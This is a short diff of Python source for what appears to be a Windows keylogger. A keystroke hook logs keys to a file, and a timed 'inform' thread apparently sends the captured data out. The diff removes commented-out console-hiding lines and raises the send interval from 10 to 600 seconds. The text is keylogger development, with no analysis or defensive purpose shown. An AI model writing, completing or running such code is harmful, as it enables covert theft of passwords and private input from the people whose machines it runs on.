@@ -1,10 +1,6 @@
 import win32api
 import win32console
 import win32gui
-
-#win=win32console.GetConsoleWindow()
-#win32gui.ShowWindow(win,0)
-
 import os
 from ctypes import *
 from _winreg import *
@@ -87,7 +83,7 @@ def KeyStroke(event):
 		   f_des.close()
 	# pass execution to the next registered hook
 	
-            if (time.time() - st_time > 10):
+            if (time.time() - st_time > 600):
 	             print "Sending >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>"
                      st_time = time.time()
                      thread_i = threading.Thread(target=inform)
